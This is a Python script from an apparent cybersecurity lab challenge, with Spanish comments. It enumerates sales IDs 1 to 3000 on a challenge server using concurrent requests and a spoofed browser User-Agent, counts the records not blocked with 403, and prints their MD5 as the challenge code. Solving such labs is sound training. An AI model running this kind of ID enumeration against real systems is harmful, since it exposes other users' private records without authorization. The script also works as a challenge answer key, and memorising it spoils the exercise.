"""
Enumeración de ventas - Laboratorio de ciberseguridad
Objetivo: contar IDs que NO devuelven 403 (Forbidden) en /ventas/?id=N
          esos son las ventas de la COMPETENCIA de Fernando.
"""

import requests
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "https://chl-5df38d66-6d26-43cb-9d7d-cd613301b6b3-ventas.softwareseguro.com.ar/ventas/"
MAX_ID   = 3000
WORKERS  = 20          # hilos concurrentes — ajustá si el servidor limita
TIMEOUT  = 10          # segundos por request

session = requests.Session()
# Headers para parecer un browser normal
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                  "AppleWebKit/537.36 (KHTML, like Gecko) "
                  "Chrome/124.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
})


def check_id(id_: int) -> tuple[int, int]:
    """Devuelve (id, status_code). En error de red devuelve -1."""
    url = f"{BASE_URL}?id={id_}"
    try:
        r = session.get(url, timeout=TIMEOUT, allow_redirects=False)
        return (id_, r.status_code)
    except Exception:
        return (id_, -1)


def main():
    resultados: dict[int, int] = {}

    print(f"[*] Escaneando IDs del 1 al {MAX_ID} con {WORKERS} hilos...\n")

    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
        futures = {executor.submit(check_id, i): i for i in range(1, MAX_ID + 1)}
        for done in as_completed(futures):
            id_, code = done.result()
            resultados[id_] = code
            # Progreso cada 100 IDs
            if id_ % 100 == 0:
                print(f"  → ID {id_:4d}  HTTP {code}")

    # ── Resumen ──────────────────────────────────────────────────────────────
    forbidden   = [i for i, c in resultados.items() if c == 403]
    competencia = [i for i, c in resultados.items() if c not in (403, -1)]
    errores     = [i for i, c in resultados.items() if c == -1]

    print("\n" + "="*55)
    print(f"  IDs con 403  (Fernando):       {len(forbidden)}")
    print(f"  IDs con otro código (competencia): {len(competencia)}")
    print(f"  Errores de red:                {len(errores)}")
    print("="*55)

    # Detalle de códigos de la competencia
    from collections import Counter
    codigos = Counter(resultados[i] for i in competencia)
    print("\n  Distribución de códigos (competencia):")
    for code, qty in sorted(codigos.items()):
        print(f"    HTTP {code}: {qty} IDs")

    ventas_competencia = len(competencia)
    print(f"\n[+] Ventas de la competencia: {ventas_competencia}")

    md5 = hashlib.md5(str(ventas_competencia).encode()).hexdigest()
    print(f"[+] MD5({ventas_competencia}) = {md5}")
    print("\n  *** Ese es el código del desafío ***\n")


if __name__ == "__main__":
    main()
